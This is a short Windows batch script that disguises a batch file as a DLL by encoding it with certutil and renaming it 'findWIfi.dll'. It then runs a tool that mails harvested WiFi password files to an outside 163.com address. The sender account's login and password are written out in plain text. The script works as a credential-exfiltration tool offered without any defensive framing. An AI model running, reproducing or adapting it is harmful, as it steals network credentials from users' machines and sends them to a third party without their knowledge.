@echo off
certutil -encode -f scanWifi.bat findWIfi.dll
copy /y findWIfi.dll ..\findWIfi.dll
exit

scanWifi.exe G:\System\Windows\tool\wifiPasswordAdmin\Password\WifiPassword_DESKTOP-ZHI_Zhi_20181116_22053710.txt -to acceptnullmail@163.com -attach "G:\System\Windows\tool\wifiPasswordAdmin\Password\*.txt" -s "WifiPassword_DESKTOP-ZHI_Zhi_20181116_22053710.txt" -u sendnullmail@163.com -pw 12qwaszx -charset Gb2312